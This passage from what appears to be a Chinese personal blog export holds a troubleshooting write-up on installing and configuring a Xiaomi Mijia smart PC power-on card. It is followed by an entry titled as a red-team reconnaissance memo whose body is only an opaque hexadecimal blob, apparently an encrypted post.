找到自己主板上PCIEX1口和插着POWER SW线的位置（上图更清晰一些），先将主板上的POWER SW线拔下来，插入到开机卡上空着的引脚上，再将开机卡上的那根POWER SW线插入到主板上（也可以看下图操作）

这里拔的时候很容易将其他的线也拔下来，所以我们根据下图所示，依次将POWER SW线(右上角)、POWER LED线(左上角，+左-右)、HDDLED线(左下角)、RESET SW线(右下角)（这里的位置是面向自己，上四下五，插的时候有字的一面朝向自己的方向插入）

最后将显卡啥的都装好后开启电源，手机就会弹出一个情景Mesh通断器TM系列并将其添加至米家，可以看到这里设备是离线的

点进去看到好像是什么蓝牙直连的，于是打开蓝牙确实有个Mesh Ali_Mi Light的蓝牙设备

但是连接后并没有解决设备离线的问题，想起前面小爱音箱好像没开启mesh网关，于是下了个小爱音箱APP登录后打开蓝牙Mesh发现确实没开启，连上后还是没能成功连上设备


于是拆开电脑重新插一下开机卡，让它断电（相当于重置开机卡的flash），再打开米家就显示正常了成功撒花🎉

不过这里我高兴的也太早了，尝试语音打开电脑会发现小爱音箱正常回复开了，电脑也亮了，但是就进不去系统（难道是在自检？再等等……TMD十几分钟过去他还是暗着的），然后打开米家进入设备点击开关机也毫无反应，按重启键再仔细观察发现连华硕的那个标志都没出现过

后面再次尝试会发现它开始出现华硕的标志，但是一闪而过，再次尝试发现它还能进系统了，但是刚看到桌面它就自己关机了
这里应该就是小米的bug（不愧是小米的模组，客服的回答也是让我一头雾水看不懂他要表达什么），需要前往米家，关闭点动模式

再打开通电后默认状态，选择修复断电前状态

最后再来试试（先稳妥点打开米家手工点击开启进入系统后再进行语音控制）发现成功了！
]]></content>
      <categories>
        <category>折腾实录</category>
      </categories>
      <tags>
        <tag>开机卡</tag>
      </tags>
  </entry>
  <entry>
    <title>红队备忘录-信息收集篇</title>
    <url>/2026/02/01/%E7%BA%A2%E9%98%9F%E5%A4%87%E5%BF%98%E5%BD%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</url>
    <content><![CDATA[
  a225aaeba5e546997ae504eef50c6509b2f83298883a7e212d64a9233d19d6c87f975e21ef5b44fb1258dcce91f49aa7524b31cbc493337b9582a7050dc83be0a14aa7871c62e7e642eaa9a28ddad3f4ea6e73df57f4b9fe62ce10223924823df1ae963fc2c5f0ab71423a53f7e018235b0a9b0934b90e4e5bfb0faef15895ede5fabb091df2d2235ffb81d943afb8839d1ba9814afa310b7d7b3e03426bccf38e6d1b9bc590f25b0d050b43d9646891a97866f3bb3a7220e737501af0d443d13875b00609874bed1139d9bc97459eb1b8739c3de032429428b775be8d7021b7dfc8e02efba3054e678de58ae9f8b7aedd4e2546f9640413916a41be9b35bedd18cf6fe6175dec38da72fec88cb480113173787d879778c602b888c58f71facb1bbba78370b1c29fdba8d348ed615aab3170f1568139faefb0fd1952e5330fcf623ecaf20dc506399a538a00db765e628a12f87c3695f31b7b23da642ce800baba565ce1cc85708e83c140764589e162c45e33ad82fd472e567b8fb8ab3546f66391f209f99cf9cdabee4d8c130f4aecdbeee8e77107c3cced1b6e7abb96a24f5f23a2392589735bba0588ad757218e31249bf8c8d05595dd25a7ca1f32884abf80b90f2be9f3949e4fc72febb7db9091b7dd5255d38d3493058401583d120a8356eaab19f41f8334421d5a6353b8e205483b8ab32e257656261883e2f9b62e3a84458b8a1104793c39ac2b81d1579883accf28ad44caf39bf992925d0168fca2003dcf9d2904f85c71a322c0e41c408b549f24fad033f8133436bec87b896d99798c30b569eb7a47fc2ea20a2c0fc51da2589bfb74533f1e41ccdff925a1288ff0d246fed9339bedc595ee78f70cc64a9b1c602ef2571e9220711c1a51cfa2688ec0d39c661cf86e34c2749704730cfbbf3883e1f98fc38e2b4803ef26cbc41f9ff78d9c3b4730c2e5dbecafe8476a59dffd4622d0ccbf898dfed6aa3f20f4ea1104336a4dcc902f4672fcfb1bcfe30a205d7438ee7fe111e91c7971583ed9a33c9b4af2a1464dfcb36d26cb7318ce975eb735d342d31ca4ef4c21999770844ea77ec47a2930f3c3b60e9d043ab9fe6e7387a6b76c28f63ce8d8af9d49213d71667fe41ec8f518c894dc5947d387953aaa155b121aa12a87abebd18fe1f62fe595aca1203bc7a653ce9b309e07f80e3912a158d63d0e73d8a54c1bff69d1ef3b792f7c8fecad03eac807dbd1b9f95267957aecb3120a83ebba0d3e9db18b15554a08836dd5fa5834b1d67c1cbed31864ac8f743012a8fe359433043c4ccd7a4dcfd0e61ceba4d1528aef18b300c0ba92ac4312bb614ce5f488b7f05fdb112aff410995034b7440c4bd2cd9bbc3fa7ceff172d016de7dc75facd1c5e0646c261eb76e116a7c4f885e2882ae1eb98cb2ae14b6374ae71fbbafeeaa7539882095c9384ddfe9d0506886cd92bb43841c76be6d33bbd33ace9e037136bbaffa9383db3a5bdad58f8b489bf38afafe5f6b20911f50d3940b6f963d8423fab710660f346e892058f618a4d18229c276c47b068cd2d893672cec281a266b7081db4b60f6ac5a81b20dedbc07825e78b6a3c3baa8dfa68a5fc236dfbfe73da5d1b5076ce81dafee3dfcd75092c6a464b901999576049575b57361e54ac830b5d7b6851fd3f0ff3abc4d01749f3b9537fb7a2b6cae74b60a2f0e1037ecd14632667d58a1abf62a64b9ccd2d212dd4f7a6ffec4a878c1c3a0b0d124bb4affadd100ec8104a007647fe90da7db93f4c3ee1c03bd4e0aa320ce0b0ff8cacad7bfdabe157e28f71dfb8649fab5f366f846a9218d661eed70dcfa914efdeb5001a63c98bc0e30eaa98c4349395b7bdf867137ec9bf676dcc01cdd21f5a70009d3f30ea40ad3680ea6fef318889a30a7a8bc4044a34e1c1ef13a138c1b7e3543f9159cb602d120b4eb38a1f0ff780bb99fccf82e28a74cd5ff215f7dde2c89c912b91fea25a0ccd24353d357f7b30c459444284cbbfd5976d24ce85df74c29bee9b05813d624b58dcc7b2baa8fb3c6eac3dca517affb5feeb3245d98079c1205776ec2ae0f372ba0dabaf60a359f283a160a333f9713c14bad068efbc5b7a029959e013fd77d941b955d80be79d12c7f734e3e4e22e523163684887a960a11a3f510f7caea6128bb90358dfa3887e84a149a164b5bf41ba881c05a32f635e43cd922d72e851a6e6fe59c5a509670faa58bd6e4c1cd61dd3281034200a12951c774003af5f53ea07e0a4985efbd58388d12b59ba9a1bf3af5591a5be121db699cf004aba18ee872538b0169a8d2ad1655563bd605fd2a825bdcaffb9027cd7bf23698c34ed3a0e9a54aa8d4d771dd5b4af15eb01487d10e278400538d60e9691c655523387aabab229a9370592c117e55b1c5ef547faa4612eeb9e0bf391d439e92ab26153d3d82ac68c1ca5712ba2362910d37ae8584aac041a3c3f6d09d628141c092f84d7f47ec7add0a2ecc10798c9f8d296d3bac8391125db3caecc0df09e4788365928ce9d114d847576d625118051e3f0946c2e7440a0272e309827e36306dabbaa866452271c7c23e180776607aa591021f10c167a36c9bed88f8c01490cb9ce8f8e3bd38afa9f3cf41bf6dfff4906218a480d106d5314e4a633892cb2c2623615efdcbae88c2377e34de546638d156da5c6c755839f16545fb454e560bcbb0ff8b4fbbbe4295a30d51bcad050513517283b96469c20c3cdf8e69f9edda8c4f1cb689f73dd40a2694fddfdbad515eb23ff1cc74b4131069f1e0bbc7aabf4ec8cc22aad0cddad683b93809f52d6b9aca60c75c788b87fb4caccf2756e2982c7b3d7107a5fbe14771919645da6e4a30fb7beffbb20bd3039b90856c9b920a456be0e582f304ec4c2ee6f665fb98a0071bf69d96c9bab964fc23e57db18851a45e529e32dea0e9cfd3d11026ca746fe25547070c406a9a27aa53b97b3a6c4ff25db342b69b6ff7c052a4fba051fb5e4fbb2850fe755cd686c3ab763984be7d6a285ba03f32a2cc1cb1b822f7d51b1578b9056e61d6c038c0d205be329a11996634fb12d86096c64bae8fc093150900361d18ea334f33365fbf5dbfc189fa060a170433374e2e1e4bdd9bd492d4bc42dea66aff5c79a8dfe1092cdf07e9623cbc7d24d3a35068ab1b8100b8da8942f835de08f9c258023047c3fb2c09b6bd61c633d14465f031e17974cf1f5f50e9936ea5f77deda2317d33c2069590290ed279f22061eeeca5c8e67355b19f4f2c43ded8734fca2b84dfab93d3f33fb1e9f2c92d2db81750b5c90bfd18fcd94772f6329c6c5133b32b5029ab59a1fbb1aedb6cffd4746cccce7797f4767d9b9f78dda74d5adeb75509a9d4174e1e78312fa347f2da0324c20c9aad32a6c4c044d625268bc143330e8d9811ffd6f6cf649e72816c7ea5a500c52b6ad9fd4b459eb4362991722544cecf56112860a7de6e3278c89ee414cafe107d4fb55ac49b860efb86dc812b514b66bc83f73e505c85bb790f101c58a4b0d74049183f3bbffb5b4103fbc028697f2d1c2b7b252aa169e93a66ab8bcf60e6ba9f3813f8f3c2479dd45c4ba9f459bb1b61a880fed7da512453ff32bc4dde910f61cf2618113b10ce58a2ebfcf0ec0535a6431844587bf6649dd1689a9ebfab151a7a3dfe337ece0764ddd14ec9fdafe75804ed45c11b8ea8629931f8314c0a3bcbe3525cdd87d5dfacb98a3dd1b6b0a52bfdfa13ae0810d4edd7453c35d9ccdbea8d7f0b2850d79b006388d21497c876aae43c5e63374583aee9895bdb55726e8789900a73fc33767a8f353eef39bbc11ef253901e010155bddb917f4b78fdaa42441ff1839c5f8b3b829091d1109ada2bd735b3217332c9c91b7f72e1b2b9b0f300cda9c290cd284ece235297fb154d78beb1d5fe83e1c0c558d62890c73356594d6c113561ba8352f8f8203e5dd70277a9c9ae39610b60a9b11f3f3725c21dfc12f5704d473330a645f6e0087fd7635cdd0d7938baf8bd08e82837ce75a06f2737416849f640baabd2c622b786247d5ccb6eddbdbd830cdac23d21b8059d0c30b695fe6d3b8b3b2f54ef428840ae745a7d05f1fa6f119ac20249d03aff863a1e3c7e158622dccc2229c609caaa8984e365899043b24df8642bd0615164fa856be841a6934d736685559440eb3ae88a13a5e2ff72b984da29f34d26da82653c1da8c22e6609536ed7d096fc34f54ed3bec7a7bc823acb23423068b56f9604eaedbfdd75c01f28409e629c021492a7a1580bb582fb52e9cf354ee9be4c1021f99794f4fd559b531ea7a2d6416f1f15f625c9503827878a2fbce5cc3162683e4650219305d1b063d003877f50fc50ea065ff23a0c3b6624f73001b0bebd76f0b92b4368e494b2eaca72ccec95155ef5b58d1548eef8e23c7a60e7e65fb47c795cf662416f92ea47abb8d059655998d04a18922996e4745924b09dde20bec5886d8e4d4bda5fe70e094abf54d315c3c6a90677bcdcbc2c0bee4d598b6ed33836485635fd2e1ebe0d35e0bb382befa36d86d6a5fc1d187b74cc01d74913df9daaea9388a97cffde7ebd256e7144914785dc2a01637a452ef02da768ffedca005d0859698243243f74eb119ff3e3540e7684882ae4084fff92568745784afa4432e2c94022492c16224a98de51ac63fd08ee0886e1326bcb88ff3b31decf1db40e93e328744f5338c6f2cb1a1ee641ce70809f37abdd8f397f4284667473c428c21b59cb67cc273bb30b6bc12038bb48d640b517cdd7b1b037f95fa23d32aed79b301ae2cb3a5837c1efb2686136a0c8125d7e7b645d1265f242084f16bb43a299a74402fd0be9c73c717c9b566b484c1e8d07173d4b80af6135b644a513cee3fca13b5286d2cd55db62b18f747313a9bc915f3603426c6ff3e9f261fdd7d4f92af52a62f669165ca957e49cad4b4990249a1ecd467ee9e1ac8bed9ccca2713befbb8fc2c84ca5bea085e861d11fae0e3ba49ace3ae4d825ea904d62dff6acb6c41bde21ae24da3ab2a9b2d84040599015f7ed76466845a1541df03dadbca5ecc10bdebef8809c8478aa489117486eba1c1a352ce23cb380425712cc54f8bef0bc5bc856dbc9e55fb8f3faa2016b3e4f1d4f72b75003450f66fef665180119a706fee584a79d489ad8c077fb737fbfb12163ffdd6c554f332e81091492a1048b584630564ac2e59a2cdc966d3e10255fe0473faa7f4f6bf08b902870da9c9b33225440bf0443aee66295ff5b7228466205c5a854369341b6e5044da74688c26082c4ad933f65fc0c456e9465c2457c6dc82742fa26d70c7340050a0867edaf6cd36c56ad3a0b9dc198093253665a37b867dbb795a9b8376cdcc82800dd342595967878c840e062662e8fbe6f4353194863e2c791112ae0f05669c130b9badb4dc92bbf61f339df69b568f9d8aaefe472e4170a0f788c52c16e884a97cbefba05bbc31766e8d58ac665c35d10460e1ca92779815eee5ab9f2809ff6d512d284f599e227c3fb40c8a0dd5b9053e1e4c976ebd9fb687bdbeb7e6f9bcdf2ff294e9c69dc70b675113aba4ece85a1ff01a5bb5bab59feacc4483916635ff962dacd2472bdb81a9b3af2c65344c8120a471f1536717d665597f8b43a4b83607df126460802eff9149e2b4d405534111e58ff85bd573dadd287f3b4adc78500b85f11bfd4ebf072f2479848fc98e3314a51c027bb91c69cde99c2298322c4489ec2f4419f40e995e591e335bdc7bd521666f888f31943d52f0519138a9b3705c979ad39bb3371987f9a4858044e7623e483082ae3193e568fcd05659c3143381ecea97a581023358cb8e0c669b641958b24848e8fc0308cc3cf1c13cfd8dbaa448a3813a607bac0bf13e0ba0d1d972ff10823d3ba508d4e6ca00d2eab5159306140e58f106b1c18d0bf618d3ae8f2e8cc747e62249fbb6033c5c9c2225abdd923bc53eebbb0f1bc8eb2f084c54fd740f869721e8e85e5ae7808db45ad90f63a565fe29f109daecf4cb209c8407001276184088fe322367597404ac3ed27fed022bac2ca42175fddcc7cc534b67cac50ae5964e1b9a6ae55ef7501d9370f95429c167ff1be4f9cc87814b2663b8b92a5249840eb53011c6a4128103e929c29cfede259db61f4709b76fce1f60ca4df1e34b6feee06e44ffe0e151deec4284931370f94e86100ab5f7222fef8f2d31e5187fceff616aefda49d326e8cb488effe46769d48604a18e413dbb46c245bb4042b6654a52c2e34c9f415b5ec7cb1f01fb96b2b4cedc5c33e0f6995a912e3dd001244a2ef9bda0f3b39a8ee611ef789cb07caa076fb2ce08a14f44add7f48ed66b13836cd499fa3024c93586ebd64edcfcf46149d64b985053f8289dccd99331568d2a8ad1d57b0a546996ec3c8d5a344d153b780daeffd49617e3b738a4d737778e4a2c271d321ed42bdfcc71e458b2e7aa3a661145494796a393b4539fdde38c737659032f3c3884a58f58521f7bdbc3f5fa2bb7a5f4957f46d021936422351c6fa07e55c361e0b3f9fade6f36f29cf85f7ec944cf5447549edc1fa2ea2570c05854f420bb0d5ccfd9187c180dd5fdc7dacca954ab02d004cd2fce9c67c113cbeffae6af1fb2767c83d572944a7227aef0408d0178c19390ba8b6a410afd283c594e00d5628692581a2b8c56060ab2f5e016fc78e195769d9c66c417b398975797ea6907bad55700f90461289e99c70cd9017fe3d4676195a8d9804d89889cb1f4b3dcdfca083d6a4d72cb8174dcabf9fdf947f539c5cdf3c40cfea208d498f482195a78724a9c95e1d9c23ee91d19c0edf83daa68326e12eb61f251319d8b971ef843d30fe4b158363c3b4f22e9b87a6b91eb118cc5a69573318b86f99b60272c0231dae9b5fee2a8984de0383cb6fb6e32a74bd29f25af3222589c98a7b20a614b1638c72df687810e9ace0f1075c7c41417f050a14c04818eecbc19c6f77ebafeba8459151ddbd99378bcb9e04d2b819cec9d504f2d9a81c9d703e1c670d3312d80f60295347977b8436123cbe0faee66c1bab59e70a91e286b3a6db8878e430983fbbc9ba2ab4aa53c165f9e2b42aca635d1cdcaa427824f2b97cee725ea1192a180c195fac670e5366613cf31554c10ad142368693c9d49559b964db2c9b7622f57d40806f2008f7679bfca02948874cf6c739f77a14178c56452ba62221ae7a1a6388ac0888fc545238a42f9f150be9005bbe7b2426170d03f6aa192bb0014c27f5e093dd0837ee44766028e24312a0d3b614f8b10f7db07a844f5883204b27a774298dc97f48c0e0e672957a377474981962413a37bb8ccaa9e3d75607b35941d2be42506632de77cdb3aa727788f96926ec0644dc3c7bbf5393f24e6cc28ec1e284519df874ab69ecdac4a5ccf7d447f12deaa36a5f84a31838529fab2a8bb2defd543cd58d5d4c9feb13a4001606fd91137917cb301e881aa8bfcfb0d5c8bc795128ac8ac51428aa28f0345d8cb640a9f667ed45f3b8983b8fd1561a33f3ba1ffd1afa3dd568fc43f09bc7c22ddd05f146eee149a9b0a91cfb9d393f7b6d9516041f2e2e3f849f2dbc9054d84b6ccc9d72177ccf34fd691a477074f4c86f5ddb7cab1cf0efbac34d16544980d408b74de35b413bf26298d34cedadad33294d570284f9b35a50d0a3cc9343fff3b8db29350d2bdff28eb26b136239e7e6ca967a8ee5ceaf4232778129905ff69d6da5ac850e9464dcffdad17cb2f5955b0cedfac7f8dcc854d5976ccff6f409cff5103c3fb0a6e524230a0b901d5289d54a478c133503dee3e4c86f9b5348c4aff22d04c9e4fa1b9e6f0d5c3b42b5ee2ddb77149f043b85e2a80ae1baa08cd732503493f58de7eda5eb7779d6e855a684db01dbf48b4a7c38cb907b68418f9acd58613af91273244c2382bb9ec15394966ecc0fcb032bf22768ec3c81d81448c61b7b7886b4ac6d66754f127b7d38fc4cc3f7c9fdd3b6180b469489ac9fb6500d201f6bcfcaef734a0bfc32d6548d40b91ceac25d1e084cfb00d6df590f0fb5c7c56d090d23a8ab646c8040674f8099bd0fa6b18a8f0dbec4856f444f899666af8f99c876707b7b71ea4b7e0866bd7ea0fbd4d1fc32693f52a75cb786e5e0215fdf4ee645febcdfdc90456bf79e06381a5f7b8b80302cb135f11ef2b47b1cdd0cb0c8ddec052ab3daa7db7fc120cb2e52ab5c1c33ea9def7a6c1d151c977d7be185c45442c089b7ee97c5df737ab5af80ecbd069d6c1fd53ba16f57ea534378f9be4cb579ced47503f28d55ce60527e08b46c7f5fbcda8f6ddf15b8d0430e8c2ec50f62af674421925edb6248d4badf4a08db70c16254065e499e4fafe832f02131ed13b629c1ad109255dd156a0c6142b130a247dcac2a8b2f7699fd508f56bd6c556e9a8c6f607425d168b95d36c7fff35a9941636a6ac9793b3b7cbfa800645677b78e240d6179092cefc43f4ac9807ee670a00fd910c23dd38400f7394a1f36b0bae803a273ad26306b188fc4164b4a103c266dc3abf85724f7d5f5f661ade3bcaef86605085452d099b140127973c40b197488a82bb4db53b6b45eb1533d5c1a16f56bdd9d5c84e1f4cfea6f9ba498fe00e796eb877464c5a947bf9dccd4beba87072eafcbe6bc2bd675f74a116305d778b75cc2393ddd7d41a47ef215eec8d806b1deb0ba3497e96d759fa833e69dd286ff4190fe13e2de6b6c58f34fd82fddae6535a5f9fa0164aae9389be7439ac1e92d89361967eb41a6ef23d830fb6b99a6e70a28695d91d830deae413b5118099c60c818689a80537fe74db3667b59756ec5e97bfc3df1c1a00020a51cf91ecf54bacbe0ba932ba8a346ae797b3214130e4bd9e9f6b812981fa6da48a6b79a0f8024b1239d61cf2322adb25ef886ec4a0711bcc4bfb8ca7677f39c62b112a889d0f94af4ff5c00d75d4ed8e4fac2a5446370f58e08febc14cf1771b26748a25f4df4e2dc82cace83793d713444ec8e5f2a21c005e86a908a56a1b7fecfc367c65522ff90b9585ae8bcd5d22c51122584ac13e04dde525974d96ef946e1ee6444c190901b704072f49d189f2058fd327a9d5ab7c5d5429e72613cb14fba6b9c57488fd134b1204acf4718a5e2bc8b8d086cd145ebd2d34bcac5066932f70009b7be4e9e4e6d89c37d4ce1e00d1ac4cd626e9c289e5d2f6b1e775122fb089d69fbcce94d312ac666ab1dbb1e5a5946afd53b9e63159457954f5529a99087b067a388d2c6c23d06cebef3162c87563db9dcb78484df902e0b1da3194679fae69d4fe53d1b9a1bb14c2b42794f84d0a45f6a3183705c5bc7ba126a1d41159943c5a415012d5c44a1432bd649395b8edfc0da8a5257096e742ccf26723ea0fcadb99c328ebd1f0df7405c552d618c3051cfa8a23f536bfbdd05a7ad026f5c490bcaabdb6e5333e8c175a2b1cbc6195a1999fb4b3d32c8ad5b526e36daffb5b6f09a003b0b65161db144913098f5dbc9052d93d9be8dd30ba585ebed9c2b175c170b55fecb66bbcc4efa0aa6d57637314c4f41556c32b45c6596aab6b936a6039f1e884b0607bc6534190fe68b5e90473ffa4c51e82db1dd22ba933bbae8e69e9c9f5c9d8279354b27b2bba7295b49d101eb800f87e3cebe8f76f255b13b4ca4c0eea3d7d59594e60b03762b29a7e15ee5e9a6a9c25139237834cbc425dd5ba7759cf7a20d7d3ba42234c53ae3fe9d56fa8e29cc35153e02e291d2b11951db3833c4c5550e985886f788a91a3d4fd850d7f15725f549d9ce182bbe29c7cbbf944eef8ba9e7b10faf99a37ba607739412f4bfc3d6c29c861138324fcd639068cdb3c5f963f88ee9eaead519e67be0de88f6eeb643ed1f3d36d3ef96dece0199ee83e01e9c776b9d2b64deb8a8e9ebd6baa77f21801904364d5ca3a9ea04e7283f2af70e6a04ab06122bb7b28328454efb2ac2cc6831cc78e85c7cf59c11fe90b017778a951b480cbaae95207c67e65932ed24d22d1e467777759c5b1b099ee11288d16b097d70a62abc3c2688471c7760a1a2f0ec4e338de4642aaf7526a817c64d140b31f38560b4bacfb0c9449f14f71e68a148da12e4fc249864002f05ad8959ef72e68824298949acfeff9d0a9986930c24d36b9782ae766a07d61253334b165999da6b931444721a0146d29c49d0eebba981a0432413eb92991f19a466afe7c73b41ae22a0a4f066b2ee31f8bbbe0be310c1ab681f21ba7c907c2770471bc00eb80d7118c6616e17b6bd2cc3bb02d56143190068e9138911acf1c426a425427cf5f6f427c96d151f964ab53789faf50ac37639723d58e91e2eddbb9f2c12e0b639ee6946fb04aa455a88ccdea186fbba668b97845fd9191da8485a898fce9a62c1209656e768f2c6010cd9292eb9242240efdb88ea9177fbe8d136bfdad45fc6a8da4e7b72ab8444b2c3835896dc95f4a1d8fe5c7c709588445ac18f702cd226e2c99fab2b700e8ecabbbaca71c5dd9e50c51625c3e69106bed31269d0e9167b44da991413366dd9be47fdefd9de35cb6d918c4712f9f1b7c5b6a48a62a627844084afa0e6ece63dc1f5496c33d99663da99677c9675be3d5046a41372cf31de2407273686709afba5fb38854ef2477440536bb2775daeafd0999e6ac50b5a53142b5a4dae31089d031321e65b1b959930028b3bcdf6f06464c3a1ffd0458cc135237e72debce410bcb4e3cb8a05971efcdb9239d06e2af935119bded35d4e7cec409a6497e00eba0ed20862d797be5568e9954813e256c832e31240baf84e4f19f3c83fa67608a84e656b9a188ec3a7aa9fb1397b5e06471e8ad5db76cd43476a159af3b8de50679d74e190c6ce1978acb66b4085968ba646d2edee857431f040ca5d8f40d1ca90e10a68e3403fc8e1a6e4a81b2a1211ffa6cfdd616af7e1ba085346c6c5c7ea56804c7b8a9e63e74c82fd5bc838d2ec18f130dcf4d22ecf8bdd75fa40aa88a26df41376510698b5075473808dc14d9c1ad8640498869940cb978595980771e3f58f38a5b2e57e4819a4c296e4b52567abf7b25f4804c5665595fef115b099eb35a65b0dbc0045d46d15c28830b09cf01fd4d9facb4d33e8fb823839cded8f2f3dbf639bc02467db0a75d3d2804cd80ef035aba691234b5597eef3913fca13188daf21e6288c575809c4f18a736ceb7eb6dc5b566e8ce2b0d6834a1859c55115445496dd3193b4ba7a07c2aaff2a91f5c5d43921c62375a2f8fce62776b324975ea807ac1091c7f2c60446f562262f2fa671b0ca990fb70ae026ed821771ff7b098cd413a58f74ffcded52a348d892902c0408be34fe65f6f28c139cbdca287cd7bca8d3394405721fc8e2a9ac8eb59e687593484cd0225a85556a737955e92ad271a6a56823bba4a4922d12ddde8735b7240206c934b0a4d18781779cab1795815b2a9102b72b3853b2dd49b3dc77d3b303faa24f1f21d0a79f354dca3de6d155b243d2c12c5c36e5a1791771d21db29bbe3b1f75bbf1856d9fbd08eaef7904ba4d86cd7e84c91b0025dcb60f8fe8abbc68cb89b386179333c3c6e56815956a4d4c105e60966cee9e91213204c9b271d007fc19335c33a1fb3072a813a7b15a9cb1792c175e2604b147eb63549b5062ff93787be641401a579cd26037779ea7443b94fce2589e0dd0d39a88fb3ffef0114a9437141a2b8202abe109e7d26f11076cc90d91a1a49a4030a771d1bf54df6fb6db8374b2575b7043aebb0bd365a697aa9cbd578a6d0999c130d8bf35e9b7220cc19cc0bf1d18264bc09363a899eac2a8a5e28a974fa7d4625a68d52974229676ba7dfb2aad8dbee407394237d1236a9c2736582436b75ee1e8b0bc374d7ad4dc422b398ef8d6bbcbd5d908ba1d6acf8b453fab5577a4b3696ac9e6c055b0c7388d787d906885283f84eb194f70b29b22e629e9e90a939345ff53d48c1005e6c7440f2315fa8fe1326799fefe470f0d5eb85515ea6d1ca88a74596828c561cee4ebfb456f0934f5e9fca0262eda26eade1507039fe8f2b8f2715067e477ca1ad388931673897ab82ab2e43e925743e6f1d9b07ffc7db16a047668269e31d5376712ccdd515d9cfef3381806300b73374498e98211a343289f9549838e7f88163d6f6f4838ac7185972eec3f6cf6bf8f86faa1c5e85ecd506ed519cbf0f2f6b63c6c817485f9217ddeba732b6bf83b783bb06ee4b35e2b1e0a5d9b03ea76508ba15fe3ddcbef2fda7b6e9544e75bb15118fee1fa6bcceaa79cf6f4cbe09a2195a3d502b88c427d6fbc38591f6171f670f51c93ff8628f998a315098b236100e0d7c0403a8fe61cca5d6368706630e7000d58607e265ad16f16cc0d1251465f8e97aa754fcb4e7d018e816238e3772023f23d7ec363cd05c186558daf67b2af7d329121577261b405075f7f611c06482ff0e7c5cc3ca9023485b8c719978a154304bebc2523392a4a74de96fb92da0c12d5f63c73da379d20c5ee4f8a6d51958c087f212eec5f45c812ab3b50298648050638d56231e7f7ba95a2bc700f1fc8328302abf9d7468db4bdc2b64fadb8aabb1dece2430ae030a2fc2da232cfd173661fc91d796465562d84ab191f46aa7f056df0014bffd7380996ed29fdab2627895c1446ab151911d5cd6daff4ee89121c12548ee04000934379d4be867ac6350c3be9001c216f2c7d16fd5730530bca734212c661cdd8f843f04c0dfcbfa36822a670f60b1881fa3c557701ecc43d6a0aefc8e4a47bbdf44f8ea0aeab92818ee36fad1d6073a24ee8be9fe5ae2658607ad308ce3dcf10700fd4acece370ef9d16f47703a53cc1b7c66116aa2f2de62be69d56d57b2b1559505703adcb78d6ed595a15470960d116edd6f085c9681bfe87d9e4f096295243a1718e99a86fecd9151afaf0986d29e3597dd627ba3849cbd810f9e4fd3da711b0b22e220965fb925bc2f99fca7d742368a1e5f10551f192a55b79f7b83d4f4850733721aff7cc2177810f1f1baefe50dc24f0f76586823c4a851faf5854ed868ddb4aa78ddc4d08acd933cf43ed0c4e7f9c5792ae13846afc1452878cd1fee3162bf777963b1ccf167bb57aa8f31e77d9661030afb0cb2fccedc3bdd253d88eb4ba5f1651004167f5f9368fca5fc40ad681629c7a31a095172b4f179e7e02f47aa35c2b2d4907a286ce8640c2aeff36f47f02ef415e2d9b679a100316e2a5fcc2ce3c40e2625534316c8cb5550dc8305e73ac179e6e9c0805f373e2571043c442e2513e4818fced957f6b1e45e329c14c1d28a12f5b94d6194f7729d68fe9fc865e0e6777346487a70c0bd466d4d918e8aae38106658ef028ed84b5293595d508b5383c2c67639bacc91b7ea89e6b017d8ed3ee8884127af5ec50223d284806cdf9072246db470b4226a8b40e97f3dcdefad1ac05020a7517e1e72b39cccc3dff5b076b7261e46e143ea50354e9b19b91de93064b26a45b7487d13926d857825190a7c7c384e9bb05334dad348179e5bf064b382639083a4b49128d0da86f6cf37f3d8ed664af9826285ac2f7b6d78c0a3abcfbcbefa2a3aa9062fa0e2215000d348c87cafb76a48c87867c6fe602bc4215b4c1ec60adc6300f532d436e2fdc253d67018a8082928d290bf257eed9ee6a0aa9f7798b18157837097bd0d6690df9af6580dbe5507b898f197ff26059dde6445dd7a1e0fcc24f5f4ab9198e49582df1c500104148efa8d1acd67032e6b6bb1831520e97adb90fb070fb17e6676cad8524327ea3ec1984197beddbe0fd4b7f3c246801ed880e1b771bad2907aae8bfeab9112d90cb78a72b9d95b462b102206a35ffb367719a092693f7b6036ac8cde0c136c7c0c8c5a523b994dcb2e0547a804f27c9ad31c9fbbd8d8fcc87c608f7885d9975ac549d798fc517496db8a08ba127e75cdb35c14359cb49ffb767a761552229f66aabbf36c6d240dbb3a481142c7dcdcb9c42342b0b22a51535e917a9ed9d19df0216838a345770d85c5fb7b45985ef44af8658b3c972dc40835638c0112aff445e5d8fb8e30c9b1047b47b4b2e9edef9bc1243d120e282ef4e4526bf9b6697fa2b03275e71d2c9dfec239bdbcb7d21b2578d678035a9931f0e56ccaa77be3f39114156f4019816a695a4684ba26f9c0682e4113d5f835adfc2102b8d685c00b44ae514cd5655746eb7c669e642263496e428efc215d895800edaccbb3a9886f19e3d8e2388c350dd0bc28071702a42a4aa399d4bf6442bcdbb22349bfa04f7f17e7f735e704c69dccfeb4d1d85cb245847005f7d935ba70e56b9a6fc10eba605dbead5aab7711f233612d9b7fa6e291966802cb2b6b4796cffdd2c4b3d75c02275ab83b75a2ee457f392584fb0a623ce7cffdf1e550bf0754d4ce7a4f0fb90cecf084232bed3db9f5f66bb8ae3151f0e86cd06363409546ff973046c737bd93c4b025be768dfeb5a8bb3522832b3772159dbd74df3cc10570035f1751c45a67ac7f46f59aec57bbacf6b7aae8e25c1f21487780a78f1f5dec0022815a4388bfae9c6c6ed14d1f7aa75254ea219e00b577ede496bd5ad2488ea554a952022f541b7eebe81c1871f3e3704d68d22037a3459d0b4a0b631041889a4fef5fa52ef7c4c0462a60ed546d6935405c4c1d71ace27a821e0ea5f77a3078a7cae8bf574f17eb1e4acd64db229869884cbed657e5a4fffafc66372f06d35a8bfb95ee32b12aada7136dfb692ee337bc386efab954d74cfdedafc206e9892fd08dc812dd8c7b6597e2347c518d0c313dc2556e2d5c5c7e3badf417854c0b9ddf7428cd656210f21a8b1fe2eebe8a8dae1d5b564e89cf8a7766aa4bb957939d150d10a77e175e4dbd2326b30b5e412b2acc56b77a12e0b2eb808ffd6550748176c9f4dd4ce8aa095288f471062fdc4bca8ec7eddaf73b0642e1b24f2ff326c52d70a4535e01312d27ce1c49283460e7ef25bd8a0ce1e3d7d55dc3082103c58a984cd0efa45272a9f60b1c7e2cef7c2b5ab1a8ccdcc3fce49ebb992cc1059635e593436d72fc175ec5be194918825b764e9badb0d6be5a34de434472285c54fcd142e6fd4fe50dacee27664e7ba99207152dd236bb1909898b034ab004875a45bd2ad5597ce13de4e5ca1098d8d6be7249b6c3dbd7560d7e30c5eddde